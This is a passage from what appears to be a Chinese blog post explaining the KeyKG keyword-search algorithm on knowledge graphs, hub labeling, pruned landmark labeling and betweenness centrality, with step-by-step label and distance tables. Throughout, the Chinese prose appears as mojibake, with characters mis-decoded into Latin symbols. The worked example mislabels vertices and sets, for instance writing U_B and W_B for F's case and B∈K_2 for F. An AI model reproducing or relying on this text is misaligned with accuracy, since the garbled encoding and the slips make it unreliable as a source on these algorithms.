ï¼Œå®ƒä»¬ä¹‹é—´çš„è·ç¦»æœ€çŸ­ï¼ˆ<strong>Line 12</strong>ï¼‰ã€‚æ¥ç€ï¼Œæ‰¾åˆ° <span class="math inline">\(s_{\textrm{min}}\)</span> å’Œ <span class="math inline">\(t_{\textrm{min}}\)</span> ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ï¼Œå¹¶å°†è·¯å¾„ä¸Šçš„é¡¶ç‚¹å’Œè¾¹åŠ å…¥ <span class="math inline">\(T_u\)</span> ï¼ˆ<strong>Line 13 -14</strong>ï¼‰ã€‚ä»¤ <span class="math inline">\(u_{\textrm{min}}\in U_x\)</span> è¡¨ç¤ºä¸€ä¸ªé¡¶ç‚¹ï¼Œæ»¡è¶³å®ƒæ‰€å¯¹åº”çš„ <span class="math inline">\(T_u\)</span> çš„æƒé‡æœ€å°ï¼ˆ<strong>Line 17</strong>ï¼‰ã€‚æœ€ç»ˆ <em>KeyKG</em> å°† <span class="math inline">\(T_{u_\textrm{min}}\)</span> ä½œä¸ºç»“æœè¿”å›ã€‚</p><div class="note default"><p><strong>ç®—æ³• 1 ä¸­çš„ <code>getD</code> å’Œ <code>getSP</code></strong></p><ul><li><code>getD</code> ï¼šè®¡ç®—ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„è·ç¦»ã€‚</li><li><code>getSP</code>ï¼šè®¡ç®—ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ã€‚</li></ul></div><h4 id="running-example">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚ä¸Šå›¾ï¼Œç»™å®šä¸€ä¸ªæŸ¥è¯¢ <span class="math inline">\(Q=\{k_1,k_2,k_3\}\)</span> ï¼Œåˆ™ <span class="math inline">\(K_1=\{B,F\},\;K_2=\{E\},\;K_3=\{C,D\}\)</span> ã€‚</p><ul><li>å¯¹äº <span class="math inline">\(B\in K_1\)</span> ï¼Œ<span class="math inline">\(E\)</span> å¿…é€‰ï¼›ç”±äº <span class="math inline">\(\textrm{dist}(B,C) = 1 &lt; 1.6 = \textrm{dist}(B,D)\)</span> ï¼Œæ‰€ä»¥é€‰æ‹© <span class="math inline">\(C\)</span> ã€‚æ•… <span class="math inline">\(U_B = \{B,E,C\}\)</span> ã€‚</li><li>å¯¹äº <span class="math inline">\(B\in K_2\)</span> ï¼Œ<span class="math inline">\(E\)</span> å¿…é€‰ï¼›ç”±äº <span class="math inline">\(\textrm{dist}(F,C) = 1.1 &lt; 1.7 = \textrm{dist}(F,D)\)</span> ï¼Œæ‰€ä»¥é€‰æ‹© <span class="math inline">\(C\)</span> ã€‚æ•… <span class="math inline">\(U_B = \{F,E,C\}\)</span> ã€‚</li></ul><p>ä¸‹é¢è®¡ç®—å„è‡ªçš„æƒé‡ä¹‹å’Œï¼š</p><ul><li>å¯¹äº <span class="math inline">\(U_B\)</span> ï¼Œ<span class="math inline">\(W_B=\textrm{dist}(B,E)+\textrm{dist}(B,C) = 0.8+1 = 1.8\)</span></li><li>å¯¹äº <span class="math inline">\(U_F\)</span> ï¼Œ<span class="math inline">\(W_B=\textrm{dist}(F,E)+\textrm{dist}(F,C) = 0.9+1.1 = 2\)</span></li></ul><p>ç”±äº <span class="math inline">\(W_B &lt; W_F\)</span> ï¼Œæ•… <span class="math inline">\(x = B\)</span> ã€‚</p><p>æ¥ä¸‹æ¥ç”Ÿæˆ <em>GST</em> ï¼š</p><ul><li><span class="math inline">\(T_B\)</span><ul><li>åˆå§‹åŒ– <span class="math inline">\(T_B\)</span> ä¸­ä»…æœ‰ä¸€ä¸ªé¡¶ç‚¹ <span class="math inline">\(B\)</span></li><li>ä»¤ <span class="math inline">\(s_{\textrm{min}} = B\)</span> ï¼Œåˆ™ <span class="math inline">\(t_{\textrm{min}} = E\)</span> ï¼Œå› ä¸º <span class="math inline">\(\textrm{dist}(B,E) &lt; \textrm{dist}(B,C)\)</span></li><li>ä»¤ <span class="math inline">\(t_{\textrm{min}} = C\)</span> ï¼Œåˆ™ <span class="math inline">\(s_\textrm{min} = E\)</span> ï¼Œå› ä¸º <span class="math inline">\(dist(E,C) &lt; \textrm{dist}(B,C)\)</span></li><li>å†æ±‚å‡ºç›¸å…³æœ€çŸ­è·ç¦»çš„è·¯å¾„ï¼Œå°†è·¯å¾„ä¸Šçš„é¡¶ç‚¹å’Œè¾¹åŠ å…¥ <span class="math inline">\(T_B\)</span> ï¼Œå³å¯å¾—åˆ°å›¾ <strong>KeyKG æ‰§è¡Œçš„ä¾‹å­</strong> ä¸­çš„ <span class="math inline">\(T_B\)</span></li></ul></li><li><span class="math inline">\(T_E\)</span> ï¼šç±»ä¼¼ <span class="math inline">\(T_B\)</span> åˆ†æå¯å¾—</li><li><span class="math inline">\(T_C\)</span> ï¼šç±»ä¼¼ <span class="math inline">\(T_B\)</span> åˆ†æå¯å¾—</li></ul><h3 id="static-hl">Static HL</h3><h4 id="why-we-need-hub-labeling">Why we need Hub Labelingï¼Ÿ</h4><p>ç”±ä¸Šè¿°ä»‹ç»å¯çŸ¥ï¼Œ<em>KeyKG</em> ä¾èµ–äºä¸¤ä¸ªå­å‡½æ•° <code>getD</code> å’Œ <code>getSP</code> ã€‚åœ¨å·¨å¤§çš„çŸ¥è¯†å›¾è°±ä¸­ï¼Œä¸€ç§ç›´è§‚çš„åœ¨çº¿çš„å®ç°è¿™äº›å­å‡½æ•°çš„æ–¹æ³•ï¼ˆä¾‹å¦‚ Dijkstra ç®—æ³•ï¼‰çš„æ‰§è¡Œæ—¶é—´å¤ªé•¿äº†ï¼›å¦ä¸€æ–¹é¢ï¼Œç¦»çº¿ç”Ÿæˆæ¯å¯¹é¡¶ç‚¹ä¹‹é—´çš„è·ç¦»å’Œæœ€çŸ­è·¯å¾„çš„ç©ºé—´å¼€é”€ååˆ†å¤§ã€‚ä¸ºäº†æƒè¡¡æ—¶ç©ºå¼€é”€ï¼Œè¿™ç¯‡æ–‡ç« ä½¿ç”¨äº† Hub Labeling ï¼Œä¸€ç§ç¦»çº¿ç”Ÿæˆçš„ç´¢å¼•ç»“æ„ã€‚</p><h4 id="basic-concept">Basic Concept</h4><p>ä¸€ä¸ªé™æ€çš„ HL æ˜¯ä¸€ä¸ªå›¾ä¸Šçš„ç¦»çº¿ç”Ÿæˆçš„ç´¢å¼•ç»“æ„ã€‚è§„èŒƒçš„è¯´ï¼Œå¯¹äºä¸€ä¸ªå›¾ <span class="math inline">\(G=&lt;V,E&gt;\)</span> ï¼Œä¸€ä¸ªé™æ€çš„ HL ï¼Œå¯ä»¥çœ‹ä½œä¸€ä¸ªå‡½æ•° <span class="math inline">\(L:V\mapsto 2^V\)</span> ï¼Œå®ƒå°†é¡¶ç‚¹æ˜ å°„åˆ°é¡¶ç‚¹çš„é›†åˆï¼ˆç§°ä½œ <em>hub</em>ï¼‰ï¼Œå¹¶ä¸”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š</p><ul><li><span class="math inline">\(\forall u,v\in V\)</span> ï¼Œå¹¶ä¸” <span class="math inline">\(uï¼Œv\)</span> åœ¨ <span class="math inline">\(G\)</span> ä¸­æ˜¯è¿é€šçš„ï¼Œ<span class="math inline">\(\exists h\in L(u)\cap L(v)\)</span> ï¼Œä½¿å¾— <span class="math inline">\(h\)</span> åœ¨ <span class="math inline">\(u,v\)</span> ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ä¸Š</li></ul><div class="note info"><p>å¯¹äº <span class="math inline">\(\forall v\in V\)</span> ï¼Œ <span class="math inline">\(L(v)\)</span> ç§°ä¸ºé¡¶ç‚¹ <span class="math inline">\(v\)</span> çš„<strong>æ ‡ç­¾</strong>ã€‚</p></div><h4 id="supporting-for-computing-getd-but-not-getsp">Supporting For Computing <code>getD</code> but not <code>getSP</code></h4><p>åœ¨æ ‡å‡†çš„ç´¢å¼•ç»“æ„ä¸­ï¼Œæ¯ä¸€ä¸ª <span class="math inline">\(L(v)\)</span> æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«æŒ‰æ ‡è¯†ç¬¦æ’åºçš„ hubs ã€‚å¯¹äºæ¯ä¸€ä¸ª <span class="math inline">\(h\in L(v)\)</span> ï¼Œ<span class="math inline">\(\textrm{dist}(v,h)\)</span> ä¹Ÿä¼šé¢„å…ˆè®¡ç®—å‡ºæ¥å¹¶ä¿å­˜ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹å…¬å¼è®¡ç®— <code>getD</code> ï¼š <span class="math display">\[\textrm{getD}(u,v)=\begin{cases}\underset{h\in L(u)\cap L(v)}{min} \textrm{dist}(u,h) + \textrm{dist}(v,h) &amp; L(u)\cap L(v) \ne \emptyset\\\infty &amp; L(u)\cap L(v) = \emptyset\\\end{cases}\]</span> å…¶ä¸­ï¼Œ<span class="math inline">\(\textrm{dist}(u,h)\)</span> å’Œ <span class="math inline">\(\textrm{dist}(v,h)\)</span> åˆ†åˆ«å­˜å‚¨åœ¨ <span class="math inline">\(L(u)\)</span> å’Œ <span class="math inline">\(L(v)\)</span> ä¸­ã€‚</p><p>ä½†æ˜¯ï¼Œæ— æ³•è®¡ç®— <code>getSP</code></p><h4 id="improvement-in-construction">Improvement in Construction</h4><p><strong>åŠ¨æœº</strong></p><p>ä» <span class="math inline">\(\textrm{getD}(u,v)\)</span> è®¡ç®—å…¬å¼æ¥çœ‹ï¼Œå½“ç´¢å¼•æ ‡ç­¾è¾ƒå°æ—¶ï¼Œ<code>getD</code> çš„åœ¨çº¿è®¡ç®—ä¼šæ›´å¿«ã€‚ä½†æ˜¯ï¼Œæœ€å°åŒ–ç´¢å¼•æ ‡ç­¾çš„å¹³å‡å¤§å°æ˜¯ä¸€ä¸ª NP-Hard é—®é¢˜ï¼Œå¹¶ä¸”å…·æœ‰å¯¹æ•°ä¸å¯è¿‘ä¼¼æ€§ï¼ˆ<em>logarithmic inapproximability</em>ï¼‰ã€‚ç»™å®šä¸€ä¸ªå›¾ï¼Œæœ‰å¾ˆå¤šä¸åŒçš„å¯å‘å¼çš„æ–¹æ³•èƒ½å¤Ÿæ„å»ºåˆç†çš„è¾ƒå°çš„ç´¢å¼•æ ‡ç­¾ã€‚åœ¨å…¶ä»–çš„æ–¹æ³•ä¸­ï¼Œ<em>pruned landmark labeling</em> (PLL) æ˜¯ä¸€ä¸ªéå¸¸çƒ­é—¨çš„å®ç°æ–¹æ³•ï¼Œå®ƒåˆ©ç”¨äº† Dijkstra ç®—æ³•ï¼Œå¹¶ä¸”èƒ½å¤Ÿé«˜æ•ˆçš„å‰ªæè¾¾åˆ°ç¼©å°ç´¢å¼•æ ‡ç­¾å¤§å°çš„ç›®çš„ã€‚</p><p><strong>ç®—æ³•</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo2.PNG" alt="Algorithm 2" /><figcaption>Algorithm 2</figcaption></figure><p>å¦‚<strong>ç®—æ³• 2</strong> æ‰€ç¤ºï¼Œæ ‡å‡†çš„ PLL åŸºæœ¬æµç¨‹æ˜¯æ‰§è¡Œ Dijkstra ç®—æ³• <span class="math inline">\(n\)</span> æ¬¡ï¼Œå…¶ä¸­ <span class="math inline">\(n\)</span> ä¸ºé¡¶ç‚¹çš„ä¸ªæ•°ï¼ˆLine 3 - 24ï¼‰ï¼Œå¹¶ä¸”åœ¨æ­¤è¿‡ç¨‹ä¸­è¿­ä»£åœ°æ‰©å±•é¡¶ç‚¹æ ‡ç­¾ï¼ˆLine 4ï¼ŒLine 12ï¼‰ã€‚è®° <span class="math inline">\(i\)</span> æ¬¡è¿­ä»£å <span class="math inline">\(v\)</span> çš„æ ‡ç­¾ä¸º <span class="math inline">\(L_i(v)\)</span> ã€‚åœ¨ç¬¬ <span class="math inline">\(i\)</span> æ¬¡è¿­ä»£ï¼ŒDijkstra ç®—æ³•ä»ä¸€ä¸ªä¸åŒçš„é¡¶ç‚¹ <span class="math inline">\(v_i\in V\)</span> å‡ºå‘ï¼ˆLine 7ï¼‰ï¼Œè®¿é—®å…¶ä»–é¡¶ç‚¹å¹¶ä¸”è®¡ç®—å®ƒä»¬ä¸ <span class="math inline">\(v_i\)</span> ä¹‹é—´çš„è·ç¦»ï¼Œå­˜å‚¨åˆ° <span class="math inline">\(d\)</span> ä¸­ï¼ˆLine 14 - 15ï¼‰ï¼Œå†å°† <span class="math inline">\(v_i\)</span> åŠ å…¥åˆ°å®ƒä»¬çš„ç´¢å¼•æ ‡ç­¾ä¸­ã€‚</p><div class="note info"><p><strong>å…³äºå‰ªæ</strong></p><ul><li>ç”±äºä¸€äº›é¡¶ç‚¹ <span class="math inline">\(u\)</span> æ²¡æœ‰è¢«è®¿é—®åˆ°ï¼Œæ‰€ä»¥å®ƒä»¬çš„æ ‡ç­¾å¯ä»¥å‰ªæ‰ã€‚</li><li>å½“ <span class="math inline">\(u\)</span> ä¸ <span class="math inline">\(v_i\)</span> çš„è·ç¦»å¯ç”±æ„é€ å¥½çš„ <span class="math inline">\(L_{i-1}\)</span> æ ‡ç­¾è®¡ç®—å¾—åˆ°ï¼Œä¹Ÿå°±æ˜¯ Line 11 çš„æ¡ä»¶ä¸ºå‡ï¼Œé‚£ä¹ˆä¼šå‘ç”Ÿå‰ªæã€‚</li></ul></div><p><strong>æ”¹è¿›ï¼šBetweenness Centrality</strong></p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯èƒ½å¤Ÿåšæ›´å¤šå‰ªææ¥æé«˜æ•´ä¸ªç³»ç»Ÿçš„æ€§èƒ½ã€‚å…·ä½“çš„ï¼Œæˆ‘ä»¬æƒ³è¦è¿­ä»£æ—©æœŸæ„é€ çš„ç´¢å¼•æ ‡ç­¾èƒ½å¤Ÿæ”¯æŒè®¡ç®—æ›´å¤šå¯¹é¡¶ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œè¿™æ ·åœ¨åæœŸçš„è¿­ä»£è¿‡ç¨‹ä¸­ï¼Œå°±å¯ä»¥æ›´é¢‘ç¹åœ°å‘ç”Ÿå‰ªææ“ä½œã€‚ç›´è§‚åœ°ï¼Œè¿™å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å®ç°ï¼Œå³åœ¨ Dijkstra ç®—æ³•è¿­ä»£çš„æ—©æœŸï¼Œé€‰æ‹©é‚£äº›è®¸å¤šæœ€çŸ­è·¯å¾„éƒ½ç»è¿‡çš„é¡¶ç‚¹ä½œä¸ºèµ·å§‹é¡¶ç‚¹ã€‚ä¸ºäº†å®ç°è¿™ä¸ªæƒ³æ³•ï¼ŒåŸå§‹çš„ PLL å®ç°æ–¹å¼æ˜¯åˆ©ç”¨ä¸€äº›å¯å‘å¼çš„æ–¹æ³•ï¼Œå¯¹è¿™äº›èµ·å§‹é¡¶ç‚¹æŒ‰ç…§å…¶åº¦æ•°é™åºæ’åˆ—ï¼Œå› ä¸ºé«˜åº¦æ•°çš„é¡¶ç‚¹æ›´æœ‰å¯èƒ½å‡ºç°åœ¨è®¸å¤šé¡¶ç‚¹å¯¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ä¸Šã€‚ä¸ä¼ ç»Ÿæ–¹æ³•ä¸åŒï¼Œæˆ‘ä»¬åŸºäº <em>betweenness centrality</em> å¯¹å®ƒä»¬é™åºæ’åºã€‚é¡¶ç‚¹ <span class="math inline">\(v\)</span> çš„ <em>betweenness centrality</em> å®šä¹‰å¦‚ä¸‹ï¼š <span class="math display">\[\textrm{bc}(v)=\underset{s,\;t\in V\backslash\ \{v\}}{\sum}\frac{\sigma_{st}(v)}{\sigma_{st}}\]</span> å…¶ä¸­ï¼Œ<span class="math inline">\(\sigma_{st}\)</span> è¡¨ç¤ºé¡¶ç‚¹ <span class="math inline">\(s,\;t\)</span> ä¹‹é—´æœ€çŸ­è·¯å¾„çš„ä¸ªæ•°ï¼Œ<span class="math inline">\(\sigma_{st}(v)\)</span> è¡¨ç¤ºä¸Šè¿°è·¯åŠ²ä¸­ç»è¿‡é¡¶ç‚¹ <span class="math inline">\(v\)</span> çš„ã€‚</p><div class="note info"><p><strong>å›¾ä¸Šä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ä¸æ­¢ä¸€æ¡</strong>ï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨<strong>æœ€å°æƒå€¼ç›¸ç­‰ä½†æ˜¯è·¯å¾„ä¸åŒ</strong>çš„æƒ…å†µã€‚</p></div><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><div class="note default"><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚ä¸Šå›¾ä¸­çš„å›¾ã€‚å¯ä»¥ç”¨ Floyd ç®—æ³•è®¡ç®—å‡ºä»»æ„ä¸¤é¡¶ç‚¹ä¹‹é—´çš„æœ€çŸ­è·ç¦»å’Œè·¯å¾„ã€‚ä¹‹åä¾æ®è¿™ä¸ªä¿¡æ¯å’Œ <em>betweenness centrality</em> çš„å®šä¹‰å¯å¾—ï¼š</p><ul><li><span class="math inline">\(\textrm{bc}(A) = 7\)</span></li><li><span class="math inline">\(\textrm{bc}(B)=4\)</span></li><li><span class="math inline">\(\textrm{bc}(C)=\textrm{bc}(D)=\textrm{bc}(E)=\textrm{bc}(F)=0\)</span></li></ul><p>ä½†æ˜¯ï¼Œè®ºæ–‡ä¸­ç”¨äº† [4] ï¼ˆ<strong>TODO</strong>ï¼‰ä¸­çš„è¿‘ä¼¼ç®—æ³•æ¥ç¼©çŸ­è®¡ç®—æ—¶é—´ã€‚</p></div><p><strong>æ„é€  Static HL çš„ä¾‹å­</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><p>å‡è®¾å›¾çš„ç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><p>é¦–å…ˆåˆå§‹åŒ– <span class="math inline">\(L_0(v)\)</span> ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_0(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>æ¥ç€æŒ‰ç…§ <em>betweenness centrality</em> å¯¹é¡¶ç‚¹é™åºæ’åºï¼Œé¡ºåºä¸º <strong>A, B, C, D, E, F</strong>ï¼›</p><hr /><p>è¿›å…¥ç¬¬ä¸€æ¬¡å¾ªç¯ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>0</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>PQ ä¼˜å…ˆé˜Ÿåˆ—ä¸ºï¼š</p><table><thead><tr class="header"><th style="text-align: center;">A</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´ï¼ˆé˜Ÿå°¾ï¼‰</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>è¿›å…¥å†…å±‚ while å¾ªç¯ï¼Œ</p><p>ä» PQ ä¸­å¼¹å‡º <span class="math inline">\(A\)</span> èµ‹ç»™ <span class="math inline">\(u\)</span> ï¼Œå³ <span class="math inline">\(u=A\)</span> ï¼›</p><p>å°† <span class="math inline">\(visit[u]\)</span> ç½® 1ï¼Œåˆ™ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><p>åˆ©ç”¨ <span class="math inline">\(L_0\)</span> è®¡ç®— <span class="math inline">\(\textrm{getD}(v_1,u)\)</span> ï¼Œå³è®¡ç®— <span class="math inline">\(\textrm{getD}(A,A)\)</span> ã€‚ç”±äº <span class="math inline">\(L_0(A)=\emptyset\)</span> ï¼Œæ•… <span class="math inline">\(L_0(A)\cap L_0(A) = \emptyset\)</span>ï¼Œæ‰€ä»¥ <span class="math inline">\(\textrm{getD}(A,A) = \infty\)</span> ï¼ˆåˆ©ç”¨ <span class="math inline">\(\textrm{getD}\)</span> çš„å…¬å¼å¯å¾—ï¼‰ã€‚</p><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[A] = 0 &lt; \textrm{getD}(v_1,u)\)</span> ï¼Œæ•… Line 11 çš„æ¡ä»¶æ»¡è¶³ï¼Œè¿›å…¥æ¡ä»¶ä½“ã€‚</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ï¼Œä½¿å¾—ç´¢å¼•å˜åŒ–ä¸ºï¼š</p><table><colgroup><col style="width: 42%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><hr /><p>åœ¨æ¥ä¸‹æ¥çš„å¯¹ <span class="math inline">\(u=A\)</span> æœªè¢«è®¿é—®çš„é‚»å±…é¡¶ç‚¹æ‰§è¡Œæ“ä½œã€‚</p><p>è®¿é—®ç¬¬ä¸€ä¸ªé‚»å±… <span class="math inline">\(B\)</span> åï¼Œ<span class="math inline">\(d\)</span> å˜åŒ–å¦‚ä¸‹ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;"><strong>0.6</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>åˆ™æœ‰å±äº <span class="math inline">\(L_1(B)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span> ï¼ŒåŒæ—¶ B æ’å…¥åˆ° PQ ä¸­ã€‚</p><p>ç±»ä¼¼çš„ï¼Œæœ‰</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;"><strong>0.4</strong></td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;"><strong>0.3</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>å±äº <span class="math inline">\(L_1(C)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></p><p>å±äº <span class="math inline">\(L_1(D)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></p><p>å±äº <span class="math inline">\(L_1(E)\)</span> çš„ <span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></p><p>åœ¨æ‰€æœ‰ A çš„é‚»å±…è®¿é—®å®Œåï¼ŒPQ å˜ä¸º</p><table><thead><tr class="header"><th style="text-align: center;">E</th><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">é˜Ÿå¤´</td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">é˜Ÿå°¾</td><td style="text-align: center;"></td></tr></tbody></table><p>ç„¶åï¼Œå›åˆ° <code>while</code> å¾ªç¯ã€‚</p><hr /><p>PQ å¼¹å‡º Eï¼Œç½® <span class="math inline">\(visit\)</span> ä¸º 1ï¼š</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td></tr></tbody></table><p>ç”±äº <span class="math inline">\(\textrm{d}[u] = \textrm{d}[E] = 0.3 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,E) = \infty\)</span> ï¼Œæ•… 